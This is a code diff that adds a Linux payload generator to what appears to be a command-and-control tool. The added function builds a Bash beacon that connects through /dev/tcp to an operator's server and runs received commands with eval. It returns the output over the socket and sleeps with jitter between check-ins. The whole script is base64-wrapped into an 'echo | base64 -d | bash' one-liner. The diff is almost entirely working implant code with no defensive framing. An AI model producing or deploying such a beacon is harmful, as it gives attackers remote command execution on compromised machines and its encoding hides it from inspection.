@@ -76,4 +76,43 @@ def win(ip, port, delay, jitter):
 
     return enc_payload
 
-print(win("192.168.108.15", 4444, 10, 3))
+def lin(ip, port, delay, jitter):
+    parameters = f"""
+    #!/bin/bash
+    SERVER_IP="{ip}"
+    SERVER_PORT={port}
+    DELAY={delay}
+    JITTER={jitter}
+    """
+    code = """
+    # Beacon to communicate with Agent Server
+    while true; do
+            # Open socket
+            echo "[$(date)] Checking in..."
+            exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
+            while IFS= read -r -t 1 command <&5; do
+                    echo "Received command: $command"
+                    output=$(eval "$command" 2>&1 &)
+                    wait
+                    echo "$output" >&5
+                    echo "ac2delim" >&5
+            done
+
+            # Close socket
+            exec 5>&-; exec 5<&-
+
+            # Sleep for DELAY +- JITTER
+            lower=$(( $DELAY - $JITTER ))
+            upper=$(( $DELAY + $JITTER ))
+            sleep_time=$(( RANDOM % ($upper - $lower + 1) + $lower ))
+            sleep $sleep_time
+    done
+    """
+    payload = parameters + code
+    b64 = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
+    enc_payload = "echo " + b64 + " | base64 -d | bash"
+
+    return enc_payload
+
+
+print(lin("192.168.108.15", 4444, 10, 3))
